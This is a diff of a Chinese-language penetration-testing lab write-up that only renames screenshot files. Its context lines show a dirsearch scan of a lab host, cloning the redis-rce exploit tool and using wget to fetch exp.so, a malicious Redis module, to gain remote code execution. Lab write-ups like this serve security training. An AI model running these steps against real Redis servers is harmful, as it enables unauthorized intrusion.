@@ -67,7 +67,7 @@ dirsearch -u  http://192.168.197.69:8080 -x 403,404,400
 
 <figure><img src="../.gitbook/assets/17 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/18 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/18 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="info" %}
 因为从exploitDB中搜索出的相关漏洞是使用的Metasploit，本例决定手动执行漏洞利用。
@@ -81,7 +81,7 @@ dirsearch -u  http://192.168.197.69:8080 -x 403,404,400
 git clone https://github.com/Ridter/redis-rce.git
 ```
 
-<figure><img src="../.gitbook/assets/19.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/19 (1).png" alt=""><figcaption></figcaption></figure>
 
 * 直接执行该脚本，查看其利用方法，得知目前还差一个exp.so文件，该文件是redis的一个恶意模块，下载下来作为参数执行该脚本：
 
@@ -89,11 +89,11 @@ git clone https://github.com/Ridter/redis-rce.git
 wget https://github.com/n0b0dyCN/redis-rogue-server/blame/master/exp.so
 ```
 
-<figure><img src="../.gitbook/assets/20.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/20 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/21.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/21 (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/23.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/23 (1).png" alt=""><figcaption></figcaption></figure>
 
 *
 
